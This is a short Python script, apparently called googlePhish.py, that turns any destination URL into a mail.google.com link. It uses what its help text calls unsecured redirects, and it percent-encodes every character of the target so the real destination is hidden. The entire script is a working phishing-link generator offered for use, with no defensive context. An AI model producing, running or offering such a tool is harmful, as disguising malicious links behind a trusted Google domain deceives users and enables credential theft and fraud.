import argparse
import sys

print ("""
 _______  _______  _______  _______  _        _______  _______          _________ _______          
(  ____ \(  ___  )(  ___  )(  ____ \( \      (  ____ \(  ____ )|\     /|\__   __/(  ____ \|\     /|
| (    \/| (   ) || (   ) || (    \/| (      | (    \/| (    )|| )   ( |   ) (   | (    \/| )   ( |
| |      | |   | || |   | || |      | |      | (__    | (____)|| (___) |   | |   | (_____ | (___) |
| | ____ | |   | || |   | || | ____ | |      |  __)   |  _____)|  ___  |   | |   (_____  )|  ___  |
| | \_  )| |   | || |   | || | \_  )| |      | (      | (      | (   ) |   | |         ) || (   ) |
| (___) || (___) || (___) || (___) || (____/\| (____/\| )      | )   ( |___) (___/\____) || )   ( |
(_______)(_______)(_______)(_______)(_______/(_______/|/       |/     \|\_______/\_______)|/     \|
                                                                                                   """)


def url_encode_all_chars(url):
    encoded = url.encode('utf-8').hex()
    return '%' + '%'.join(a+b for a,b in zip(encoded[::2], encoded[1::2]))

def printUrl(src):
    print("https://mail.google.com/webhp#?uid=Z2l0aHViLmNvbS92bHA0NDM=&q=%s=&btnI=I" % url_encode_all_chars(src))



parser = argparse.ArgumentParser(description='Generate links to google searchable urls using unsecured redirects in mail.google.com.'
                                             'Usage python3 ./googlePhish.py --url <url>')
parser.add_argument('--url', metavar='Location to link to e.g. https://cutecatsinhats.com', type=printUrl, nargs=1)

try:
    if (len(sys.argv) < 2):
        raise Exception
    args = parser.parse_args()
except :
    parser.print_help()
    exit(1)